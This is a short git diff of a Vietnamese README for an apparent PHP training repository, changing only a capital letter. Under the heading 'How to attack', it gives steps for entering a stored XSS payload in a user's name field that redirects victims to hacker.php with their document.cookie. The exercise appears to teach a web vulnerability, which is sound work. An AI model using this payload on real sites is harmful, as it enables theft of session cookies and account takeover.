@@ -1,5 +1,5 @@
 # Cách tấn công
-- ấn vào Add new user -> phần name điền như sau -> `<script>window.location.href = "hacker.php?cookie=" + document.cookie</script>` -> Submit
+- Ấn vào Add new user -> phần name điền như sau -> `<script>window.location.href = "hacker.php?cookie=" + document.cookie</script>` -> Submit
 
 # php-training
 * Repository: https://github.com/tailieuweb/training-php
